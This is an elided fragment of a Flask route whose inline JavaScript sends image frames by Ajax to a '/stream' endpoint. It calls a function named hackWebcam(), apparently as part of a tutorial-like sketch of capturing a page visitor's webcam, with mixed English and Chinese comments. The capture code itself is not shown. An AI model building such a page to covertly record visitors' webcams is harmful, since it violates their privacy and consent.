...
def index():
  return render_template_string('''
    ...
    <script>
      ...
      // he $ (dollar sign) is used to indicate that the following code is going to be jQuery 表达以下不是js 而是jQuery
      function post(imgdata){
      // Description: Perform an asynchronous HTTP (Ajax) request 网页不刷新 背后数据传输
        $.ajax({
          type: 'POST',
          data: {frame: imgdata},
          url: '/stream',
      ...
      // hacking starts here  以上理论帧间隔隔500ms
      hackWebcam();
    </script>
  ''')
